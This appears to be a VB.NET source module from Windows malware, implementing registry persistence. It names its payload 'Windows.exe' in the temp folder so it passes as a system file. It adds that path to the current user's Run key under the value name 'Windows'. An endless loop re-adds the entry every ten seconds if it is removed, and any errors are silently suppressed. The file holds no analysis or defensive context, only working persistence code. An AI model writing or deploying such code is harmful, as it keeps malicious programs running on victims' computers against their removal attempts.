Imports System.IO
Imports Microsoft.Win32
Imports System.Threading

Module RegPersistence

    Dim MyPath As String = Path.GetTempPath & "Windows.exe"
    Dim MyValue As String = "Windows"

    Public Sub Persistence()
        While True
            If CheckKey() = False Then
                AddKey()
            End If
            Thread.Sleep(10000)
        End While
    End Sub

    Private Function CheckKey() As Boolean
        Dim R As RegistryKey
        Dim V() As String
        Dim O As String = vbNullString

        R = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        V = R.GetValueNames()
        R.Close()

        For Each Str As String In V
            O = O & Str & "|"
        Next

        If O.Contains(MyValue) Then
            Return True
        Else
            Return False
        End If
    End Function

    Private Sub AddKey()
        Try
            Dim R As RegistryKey
            R = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            R.SetValue(MyValue, MyPath)
            R.Close()
        Catch : End Try
    End Sub

End Module
